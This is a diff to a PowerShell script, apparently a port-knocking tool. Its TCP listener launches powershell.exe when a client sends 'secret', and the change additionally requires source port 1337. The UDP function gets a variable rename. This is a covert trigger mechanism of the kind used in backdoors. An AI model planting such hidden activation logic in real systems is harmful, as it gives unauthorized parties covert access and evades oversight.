@@ -31,14 +31,14 @@ Function New-TcpServer
             $TcpClient = $TcpListener.AcceptTcpClient() 
             $TcpListenerStream = $TcpClient.GetStream() 
             $BytesIn = [System.Byte[]]::CreateInstance([System.Byte],64)
-            
+            $RemotePort = [Regex]::Match($TcpClient.Client.RemoteEndPoint.ToString(), '.+:(\d+)').Captures.Groups[1].Value
             While ($($x = $TcpListenerStream.Read($BytesIn,0,$BytesIn.Length)) -ne 0)
             {
                 $EncodedText = New-Object System.Text.ASCIIEncoding
                 $TcpClient = $EncodedText.GetString($BytesIn,0, $x)
-
+                   
                 # If the data passed as part of the port knock matches what we expect, we can begin running operations.
-                if($TcpClient -match "secret")
+                if($TcpClient -match "secret" -and $RemotePort -match '1337')
                 {
                     Start-Process powershell.exe
                 }
@@ -78,12 +78,11 @@ Function New-UdpServer
     Param ( 
         [Parameter(Mandatory=$True)]
         [int] $LocalPort)
-        
         $LocalAddress = New-Object System.Net.IPEndPoint ([IPAddress]::Any, $LocalPort)
         Try {
         While($True) {
             $UdpClient = New-Object System.Net.Sockets.UdpClient $LocalPort
-            $content = $UdpClient.Receive([Ref]$LocalAddress)
+            $Content = $UdpClient.Receive([Ref]$LocalAddress)
             $UdpClient.Close()
                      }
             }       
